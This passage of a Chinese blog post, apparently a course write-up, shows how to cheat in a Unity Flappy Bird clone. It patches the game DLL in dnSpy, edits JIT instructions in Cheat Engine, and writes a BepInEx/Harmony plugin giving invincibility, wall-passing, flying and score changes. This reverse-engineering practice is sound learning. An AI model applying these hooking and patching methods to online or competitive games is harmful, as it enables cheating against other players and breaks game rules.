class="hljs-keyword">this</span>.cheerClip);<br>        GamePlayController.instance.finishGame();<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">OnTriggerEnter2D</span>(<span class="hljs-params">Collider2D target</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (target.tag == <span class="hljs-string">&quot;PipeHolder&quot;</span>)<br>    &#123;<br>        <span class="hljs-keyword">this</span>.audioSource.PlayOneShot(<span class="hljs-keyword">this</span>.pointClip);<br>        <span class="hljs-keyword">this</span>.score += <span class="hljs-number">233</span>;<br>        GamePlayController.instance.setScore(<span class="hljs-keyword">this</span>.score);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>dnSpy修改方法并重新编译，替换原<code>Assembly-CSharp.dll</code>程序集，运行游戏测试</p><p><img src="assets/2023-10-27-15-15-10-image.png"></p><p>无敌功能和分数修改功能已实现</p><ul><li><h4 id="Cheat-Engine动态修改实现"><a href="#Cheat-Engine动态修改实现" class="headerlink" title="Cheat Engine动态修改实现"></a>Cheat Engine动态修改实现</h4></li></ul><p>开始游戏，暂停后使用CE打开游戏进程，选择<code>Mono-&gt;.Net Info</code>查看进程加载的模块信息，选择<code>Assembly-CSharp-&gt;BirdScript</code>模块</p><p><img src="assets/2023-10-27-15-23-26-image.png"></p><p><code>instance</code>为当前的小鸟实例，可以查看当前小鸟实例的成员属性和方法</p><p>可以查看和修改<code>OnCollisionEnter2D</code>和<code>OnTriggerEnter2D</code>的JIT代码</p><p>先分析<code>OnCollisionEnter2D</code>的JIT代码，主要分析跳转指令</p><p><img src="assets/2023-10-27-15-38-32-image.png"></p><p><img src="assets/2023-10-27-15-39-02-image.png"></p><p><img src="assets/2023-10-27-15-39-31-image.png"></p><p><img src="assets/2023-10-27-15-39-57-image.png"></p><p>根据之前的源代码可以轻松分析处这部分调整是判断小鸟是否碰撞到会死亡的物体，当或语句中有任意一条成立时，跳转到<code>0x121</code>行执行，如果或语句中3条判断都不成立，跳转到<code>0x1a4</code>行，进入到<code>0x121</code>行后，会判断小鸟的<code>isAlive</code>是否为<code>false</code>，为<code>false</code>跳转到<code>0x255</code>行退出调用，否则执行后续代码</p><p>另一个判断是否碰撞到棋子的分支类似</p><p>将第<code>0x127</code>行分支修改为强制跳转，不执行后续代码，即可绕过小鸟死亡代码的执行</p><p><img src="assets/2023-10-27-15-47-50-image.png"></p><p>回到游戏进行测试</p><p><img src="assets/2023-10-27-15-48-36-image.png"></p><p>小鸟的无敌效果已经实现</p><p>查看<code>OnTriggerEnter2D</code>方法的JIT代码</p><p><img src="assets/2023-10-27-15-50-18-image.png"></p><p><img src="assets/2023-10-27-15-50-41-image.png"></p><p>很明显，<code>0x4a</code>行判断是否进入到管道间隙，中间的代码为修改分数的部分</p><p><img src="assets/2023-10-27-15-52-41-image.png"></p><p><img src="assets/2023-10-27-15-53-08-image.png"></p><p>将<code>0x77</code>行inc指令修改为dec指令，使小鸟进入管道间隙分数减1</p><p>回到游戏进行测试</p><p><img src="assets/2023-10-27-15-54-40-image.png"></p><p>分数减为复数</p><p>也可以通过修改小鸟实例下的<code>score</code>实现分数修改</p><p><img src="assets/2023-10-27-15-59-08-image.png"></p><p><img src="assets/2023-10-27-15-59-27-image.png"></p><ul><li><h4 id="UnityExplorer动态分析游戏"><a href="#UnityExplorer动态分析游戏" class="headerlink" title="UnityExplorer动态分析游戏"></a>UnityExplorer动态分析游戏</h4></li></ul><blockquote><p>UnityExplorer可以使用BepInEx、MelonLoader和Standalone三种加载方式加载，测试发现BepInEx的效率要高一点，比MelonLoader加载要流畅很多，而且BepInEx的文档更完善，方便插件的开发，因此后续使用BepInEx加载UnityExplorer进行分析，同时安装ConfigurationManager便于插件的管理和配置</p></blockquote><p>BepInEx和UnityExplorer的安装在仓库Readme中都很详细，注意版本即可，此处选择的是BepInEx 5.4.22版本，安装后启用<code>Logging.Console</code>设置，方便查看日志信息</p><p><img src="assets/2023-10-27-16-15-38-image.png"></p><p>在UnityExplorer中能看到小鸟的位置信息和加载的组件信息，主要关注<code>RigidBody2D</code>组件和<code>CircleCollider2D</code>组件</p><p><code>RigidBody2D</code>组件是小鸟的刚体组件信息，<code>gravityScale</code>变量是刚体受重力的影响程度，将其修改为0可实现不受重力影响，实现漂浮效果，但需要同时将速度向量<code>velocity</code>变量修改为0，避免小鸟持续向上或向下飞行，还需要将小鸟的<code>bounceSpeed</code>修改为0，避免手贱点到屏幕让小鸟增加y方向的速度</p><p><code>CircleCollider2D</code>是小鸟的碰撞组件信息，将<code>enable</code>修改为false可关闭小鸟的碰撞</p><p><img src="assets/2023-10-27-16-36-00-image.png"></p><p>修改后就实现了小鸟的悬浮飞行和穿墙效果，但是由于禁用了碰撞组件，因此不会检测与管道间隙的碰撞，分数不会增加，接触棋子也不会结束游戏，想要保存穿墙效果的同时能够增加分数，可以将所有管道、敌人的碰撞组件禁用</p><ul><li><h4 id="BepInEx实现游戏插件"><a href="#BepInEx实现游戏插件" class="headerlink" title="BepInEx实现游戏插件"></a>BepInEx实现游戏插件</h4></li></ul><p>上述的修改方法中，除了修改程序集重新编译，另外两种均为手动修改，而且重新加载游戏后修改会失效，并且实现的功能有限，因此后续选择编写程序集的方法进行游戏破解</p><p>课堂视频中已经展示了使用<code>SharpMonoInjector</code>工具注入程序集实现破解功能，但是仍然需要手动注入，<del>不够优雅</del>，因此这里选择用BepInEx插件的形式实现</p><p>插件开发文档：</p><blockquote><p><a href="https://docs.bepinex.dev/articles/dev_guide/plugin_tutorial/index.html">https://docs.bepinex.dev/articles/dev_guide/plugin_tutorial/index.html</a></p><p><a href="https://mod.3dmgame.com/read/3">从0开始教你使用BepInEx为unity游戏制作插件Mod - 3DM Mod站</a></p></blockquote><p><del>没写过C#代码，代码可能不够规范</del></p><p><code>Plugin.cs</code>是插件的入口类代码，<code>Plugin</code>类派生自<code>BaseUnityPlugin</code></p><p><code>GlobalVariables.cs</code>是代码使用的全局变量类，主要保存插件的配置信息已经从游戏内获取的对象信息</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs cs"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title">GlobalVariables</span><br>&#123;<br>    <span class="hljs-comment">// 全局变量</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> BirdScripts birdInstances; <span class="hljs-comment">// 当前小鸟实例</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Rigidbody2D birdRigidbody2D; <span class="hljs-comment">// 小鸟的Rigidbody2D组件</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Collider2D birdCollider2D; <span class="hljs-comment">// 小鸟的Collider2D组件</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> GameObject[] pipes; <span class="hljs-comment">// 管道</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> GameObject[] pipeHolders; <span class="hljs-comment">// 管道间隙</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> GameObject[] enemies; <span class="hljs-comment">// 敌人</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> GameObject[] flags; <span class="hljs-comment">// flag</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ConfigEntry&lt;<span class="hljs-built_in">bool</span>&gt; invincible; <span class="hljs-comment">// 无敌</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ConfigEntry&lt;<span class="hljs-built_in">bool</span>&gt; collision; <span class="hljs-comment">// 碰撞</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ConfigEntry&lt;<span class="hljs-built_in">bool</span>&gt; fly; <span class="hljs-comment">// 飞行</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ConfigEntry&lt;<span class="hljs-built_in">float</span>&gt; speed; <span class="hljs-comment">// 游戏速度</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ConfigEntry&lt;<span class="hljs-built_in">int</span>&gt; score; <span class="hljs-comment">// 分数</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>Cheat.cs</code>是插件作弊功能的核心实现</p><p>下面依次进行分析</p><p>与<code>MonoBehaviour</code>类似，<code>BaseUnityPlugin</code>中的<code>Awake</code>方法在类实例加载时执行，该方法内用于绑定插件的设置，便于在ConfigurationManager插件中图形化地修改参数配置</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs cs"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Awake</span>()</span><br>&#123;<br>    <span class="hljs-comment">// 插件启用时调用</span><br>    Logger.LogInfo(<span class="hljs-string">$&quot;Plugin <span class="hljs-subst">&#123;PluginInfo.PLUGIN_NAME&#125;</span> is loaded!&quot;</span>);<br>    <span class="hljs-comment">// 创建配置项</span><br>    GlobalVariables.invincible = Config.Bind(<span class="hljs-string">&quot;Config&quot;</span>, <span class="hljs-string">&quot;invincible&quot;</span>, <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;碰撞无敌&quot;</span>);<br>    GlobalVariables.invincible.Value = <span class="hljs-literal">false</span>;<br>    GlobalVariables.collision = Config.Bind(<span class="hljs-string">&quot;Config&quot;</span>, <span class="hljs-string">&quot;collision&quot;</span>, <span class="hljs-literal">true</span>, <span class="hljs-string">&quot;开启碰撞&quot;</span>);<br>    GlobalVariables.collision.Value = <span class="hljs-literal">true</span>;<br>    GlobalVariables.fly = Config.Bind(<span class="hljs-string">&quot;Config&quot;</span>, <span class="hljs-string">&quot;fly&quot;</span>, <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;开启飞行&quot;</span>);<br>    GlobalVariables.fly.Value = <span class="hljs-literal">false</span>;<br>    GlobalVariables.score = Config.Bind(<span class="hljs-string">&quot;Config&quot;</span>, <span class="hljs-string">&quot;score&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&quot;游戏分数&quot;</span>);<br>    GlobalVariables.score.Value = <span class="hljs-number">0</span>;<br>    GlobalVariables.speed = Config.Bind(<span class="hljs-string">&quot;Config&quot;</span>, <span class="hljs-string">&quot;speed&quot;</span>, <span class="hljs-number">3f</span>, <span class="hljs-string">&quot;移动速度&quot;</span>);<br>    GlobalVariables.speed.Value = <span class="hljs-number">3f</span>;<br>    <span class="hljs-comment">// 关闭碰撞的回调函数</span><br>    GlobalVariables.collision.SettingChanged += (sender, args) =&gt; Cheat.instance.SetCollision(GlobalVariables.collision.Value);<br>    <span class="hljs-comment">// 飞行回调函数</span><br>    GlobalVariables.fly.SettingChanged += (sender, args) =&gt; Cheat.instance.SetFly(GlobalVariables.fly.Value);<br>    <span class="hljs-comment">// 修改分数的回调函数</span><br>    GlobalVariables.score.SettingChanged += (sender, args) =&gt; Cheat.instance.SetScore(GlobalVariables.score.Value);<br>    <span class="hljs-comment">// 修改游戏速度的回调函数</span><br>    GlobalVariables.speed.SettingChanged += (sender, args) =&gt; Cheat.instance.SetSpeed(GlobalVariables.speed.Value);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Start</code>方法在所有插件加载后调用，此处用于实例化<code>Cheat</code>类对象</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cs"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Start</span>()</span><br>&#123;<br>    <span class="hljs-comment">// 所有插件全部加载后调用</span><br>    Logger.LogInfo(<span class="hljs-string">$&quot;Plugin <span class="hljs-subst">&#123;PluginInfo.PLUGIN_NAME&#125;</span> is started!&quot;</span>);<br>    Cheat.instance = <span class="hljs-keyword">new</span> Cheat();<br>    Cheat.instance.Start();<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Update</code>方法会在游戏的每一帧调用，循环执行，此处用于调用<code>Cheat</code>类的<code>Update</code>方法</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cs"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Update</span>()</span><br>&#123;<br>    <span class="hljs-comment">// 持续执行</span><br>    <span class="hljs-comment">// Debug.Log($&quot;Plugin &#123;PluginInfo.PLUGIN_NAME&#125; is Update!&quot;);</span><br>    Cheat.instance.Update();<br>&#125;<br></code></pre></td></tr></table></figure><p><code>OnGUI</code>方法用于在屏幕上显示标签，并显示当前开启的作弊功能</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs cs"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">OnGUI</span>()</span><br>&#123;<br>    <span class="hljs-comment">// 在游戏界面上显示标签</span><br>    GUI.skin.label.fontSize = <span class="hljs-number">18</span>;<br>    GUI.skin.label.normal.textColor = Color.blue;<br>    <span class="hljs-built_in">string</span> labelText = <span class="hljs-string">&quot;FlappyBird Cheat Plugin\n&quot;</span>;<br>    labelText += <span class="hljs-string">&quot;written by noxke\n&quot;</span>;<br>    labelText += <span class="hljs-string">&quot;[F1] : config and more feature\n&quot;</span>;<br>    labelText += <span class="hljs-string">&quot;[ESC] : pause\n&quot;</span>;<br>    labelText += <span class="hljs-string">$&quot;[1/2] invincible [<span class="hljs-subst">&#123;GlobalVariables.invincible.Value&#125;</span>]\n&quot;</span>;<br>    labelText += <span class="hljs-string">$&quot;[3/4] : collision [<span class="hljs-subst">&#123;GlobalVariables.collision.Value&#125;</span>]\n&quot;</span>;<br>    labelText += <span class="hljs-string">$&quot;[5/6] : fly [<span class="hljs-subst">&#123;GlobalVariables.fly.Value&#125;</span>]\n&quot;</span>;<br>    labelText += <span class="hljs-string">&quot;[9] : add score\n&quot;</span>;<br>    labelText += <span class="hljs-string">&quot;[up/down/left/right] : move\n&quot;</span>;<br>    labelText += <span class="hljs-string">&quot;[0] : finish game\n&quot;</span>;<br>    labelText += <span class="hljs-string">$&quot;speed [<span class="hljs-subst">&#123;GlobalVariables.speed.Value&#125;</span>]&quot;</span>;<br>    GUI.Label(<span class="hljs-keyword">new</span> Rect(<span class="hljs-number">10</span>, <span class="hljs-number">10</span>, <span class="hljs-number">400</span>, <span class="hljs-number">300</span>), labelText);<br>&#125;<br></code></pre></td></tr></table></figure><img title="" src="assets/2023-10-27-17-01-16-image.png" alt="" width="190"><p><code>Cheat</code>类为作弊功能的实现</p><p>类加载时调用<code>Start</code>方法，进而调用<code>SetPatch</code>方法</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cs"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">SetPatch</span>()</span><br><span class="hljs-function"><span class="hljs-comment">// 设置勾取函数</span></span><br>&#123;<br>    <span class="hljs-comment">// patch OnCollisionEnter2D方法</span><br>    Harmony harmony1 = <span class="hljs-keyword">new</span> Harmony(<span class="hljs-string">&quot;com.noxke.patch1&quot;</span>);<br>    MethodInfo onCollisionEnter2D = AccessTools.Method(<span class="hljs-keyword">typeof</span>(BirdScripts), <span class="hljs-string">&quot;OnCollisionEnter2D&quot;</span>);<br>    harmony1.Patch(onCollisionEnter2D, prefix: <span class="hljs-keyword">new</span> HarmonyMethod(<span class="hljs-keyword">typeof</span>(Cheat).GetMethod(<span class="hljs-string">&quot;PrefixOnCollisionEnter2D&quot;</span>)));<br>    Debug.Log(<span class="hljs-string">&quot;Patch OnCollisionEnter2D&quot;</span>);<br><br>    <span class="hljs-comment">// patch flapTheBird方法</span><br>    Harmony harmony2 = <span class="hljs-keyword">new</span> Harmony(<span class="hljs-string">&quot;com.noxke.patch2&quot;</span>);<br>    MethodInfo flapTheBird = AccessTools.Method(<span class="hljs-keyword">typeof</span>(BirdScripts), <span class="hljs-string">&quot;flapTheBird&quot;</span>);<br>    harmony2.Patch(flapTheBird, prefix: <span class="hljs-keyword">new</span> HarmonyMethod(<span class="hljs-keyword">typeof</span>(Cheat).GetMethod(<span class="hljs-string">&quot;PrefixFlapTheBird&quot;</span>)));<br>    Debug.Log(<span class="hljs-string">&quot;Patch flapTheBird&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>SetPatch</code>方法内利用<code>Harmony</code>提供的<code>Patch</code>功能勾取<code>BirdScripts</code>类的<code>OnCollisionEnter2D</code>方法和<code>flapTheBird</code>方法，由于<code>OnCollisionEnter2D</code>是<code>private</code>方法，需要使用反射的方法设置Patch</p><p>在<code>OnCollisionEnter2D</code>方法被调用前执行<code>Cheat</code>类的<code>PrefixOnCollisionEnter2D</code>方法，判断发生碰撞的是否为管道、大地或者敌人，如果是，则跳过屏蔽<code>OnCollisionEnter2D</code>方法的执行，屏蔽小鸟的死亡，如果为其他情况，即碰到棋子，则会执行原方法，触发游戏胜利</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cs"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">bool</span> <span class="hljs-title">PrefixOnCollisionEnter2D</span>(<span class="hljs-params">BirdScripts __instance, Collision2D target</span>)</span><br>&#123;<br>    <span class="hljs-comment">// 在发生碰撞前拦截</span><br>    <span class="hljs-keyword">if</span> (GlobalVariables.invincible.Value != <span class="hljs-literal">true</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-comment">// 碰撞到flag的时候胜利，不做拦截</span><br>    <span class="hljs-keyword">if</span> (target.gameObject.tag == <span class="hljs-string">&quot;Pipe&quot;</span> || target.gameObject.tag == <span class="hljs-string">&quot;Ground&quot;</span> || target.gameObject.tag == <span class="hljs-string">&quot;Enemy&quot;</span>)<br>    &#123;<br>        Debug.Log(<span class="hljs-string">$&quot;Collision <span class="hljs-subst">&#123;target.gameObject.tag&#125;</span>&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>在<code>flapTheBird</code>方法调用前，即屏幕被点击触发小鸟向上飞之前，执行<code>Cheat</code>类的<code>PrefixFlapTheBird</code>方法，主要用来在飞行状态中屏蔽flap操作，避免小鸟获得向上的向量速度飞出屏幕<del>为什么不之间修改bounceSpeed???</del></p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cs"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">bool</span> <span class="hljs-title">PrefixFlapTheBird</span>(<span class="hljs-params">BirdScripts __instance</span>)</span><br>&#123;<br>    <span class="hljs-comment">// 在flap前调用</span><br>    <span class="hljs-comment">// 避免飞行时flap然后无法减速</span><br>    Debug.Log(<span class="hljs-string">&quot;Patch flapTheBird&quot;</span>);<br>    <span class="hljs-keyword">if</span> (GlobalVariables.fly.Value == <span class="hljs-literal">true</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Update</code>方法循环调用，用于设置按键绑定，从游戏内获取对象，已经同步游戏分数到配置</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cs"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Update</span>()</span><br>&#123;<br>    <span class="hljs-comment">// 循环调用</span><br>    KeyBound(); <span class="hljs-comment">// 按键检测</span><br>    GetObjects(); <span class="hljs-comment">// 获取游戏对象</span><br>    <span class="hljs-keyword">if</span> (GlobalVariables.birdInstances != <span class="hljs-literal">null</span>)<br>    &#123;<br>        GlobalVariables.score.Value = GlobalVariables.birdInstances.score; <span class="hljs-comment">// 同步分数</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>KeyBound</code>方法用于监听按键操作，调用<code>Cheat</code>中的功能</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cs"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">KeyBound</span>()</span><br>&#123;<br>    <span class="hljs-comment">// 按键绑定</span><br>    <span class="hljs-keyword">if</span> (Input.GetKey(KeyCode.Escape))<br>    &#123;<br>        <span class="hljs-comment">// ESC暂停 鼠标太难点了</span><br>        <span class="hljs-keyword">if</span> (GamePlayController.instance != <span class="hljs-literal">null</span>)<br>        &#123;<br>            Debug.Log(<span class="hljs-string">&quot;key ESC down, pause&quot;</span>);<br>            GamePlayController.instance.pauseGame();<br><br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>GetObjects</code>方法从游戏中获取小鸟的实例，获取小鸟的组件信息，获取游戏中的管道对象、管道间隙对象等</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cs"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">GetObjects</span>()</span><br>&#123;<br>    <span class="hljs-comment">// 获取游戏内对象和实例</span><br>    GlobalVariables.birdInstances = BirdScripts.instance; <span class="hljs-comment">// 获取当前小鸟实例</span><br>    <span class="hljs-keyword">if</span> (GlobalVariables.birdInstances != <span class="hljs-literal">null</span>)<br>    &#123;<br>        <span class="hljs-comment">// 获取小鸟的组件</span><br>        GlobalVariables.birdCollider2D = GlobalVariables.birdInstances.GetComponent&lt;Collider2D&gt;();<br>        GlobalVariables.birdRigidbody2D = GlobalVariables.birdInstances.GetComponent&lt;Rigidbody2D&gt;();<br>    &#125;<br>    GlobalVariables.pipes = GameObject.FindGameObjectsWithTag(<span class="hljs-string">&quot;Pipe&quot;</span>);  <span class="hljs-comment">// 管道</span><br>    GlobalVariables.pipeHolders = GameObject.FindGameObjectsWithTag(<span class="hljs-string">&quot;PipeHolder&quot;</span>); <span class="hljs-comment">// 获取当前的管道间隙</span><br>    GlobalVariables.enemies = GameObject.FindGameObjectsWithTag(<span class="hljs-string">&quot;Enemy&quot;</span>);  <span class="hljs-comment">// 敌人</span><br>    GlobalVariables.flags = GameObject.FindGameObjectsWithTag(<span class="hljs-string">&quot;Flag&quot;</span>);  <span class="hljs-comment">// flag</span><br>&#125;<br></code></pre></td></tr></table></figure><p>小鸟的穿墙功能，即屏蔽碰撞的功能在<code>SetCollision</code>方法中实现</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs cs"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">SetCollision</span>(<span class="hljs-params"><span class="hljs-built_in">bool</span> <span class="hljs-keyword">value</span></span>)</span><br>&#123;<br>    <span class="hljs-comment">// 设置管道和敌人的碰撞</span><br>    GlobalVariables.collision.Value = <span class="hljs-keyword">value</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; GlobalVariables.pipes.Length; i++)<br>    &#123;<br>        BoxCollider2D pipeBoxCollider2D = GlobalVariables.pipes[i].GetComponent&lt;BoxCollider2D&gt;();<br>        <span class="hljs-keyword">if</span> (pipeBoxCollider2D != <span class="hljs-literal">null</span>)<br>        &#123;<br>            pipeBoxCollider2D.enabled = <span class="hljs-keyword">value</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; GlobalVariables.enemies.Length; i++)<br>    &#123;<br>        BoxCollider2D enemyBoxCollider2D = GlobalVariables.enemies[i].GetComponent&lt;BoxCollider2D&gt;();<br>        <span class="hljs-keyword">if</span> (enemyBoxCollider2D == <span class="hljs-literal">null</span>)<br>        &#123;<br>            Collider2D enemyCollider2D = GlobalVariables.enemies[i].GetComponent&lt;Collider2D&gt;();<br>            <span class="hljs-keyword">if</span> (enemyCollider2D != <span class="hljs-literal">null</span>)<br>            &#123;<br>                enemyCollider2D.enabled = <span class="hljs-keyword">value</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            enemyBoxCollider2D.enabled = <span class="hljs-keyword">value</span>;<br>        &#125;<br>    &#125;<br>    Debug.Log(<span class="hljs-string">$&quot;collision : <span class="hljs-subst">&#123;<span class="hljs-keyword">value</span>&#125;</span>&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里实现的方法不是禁用小鸟的碰撞组件，因为会影响游戏得分，使用的是禁用游戏中管道、敌人的碰撞组件</p><p><code>SetFly</code>方法开启悬浮飞行，设置小鸟的重力影响为0，将速度向量设为0</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs cs"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">SetFly</span>(<span class="hljs-params"><span class="hljs-built_in">bool</span> <span class="hljs-keyword">value</span></span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (<span 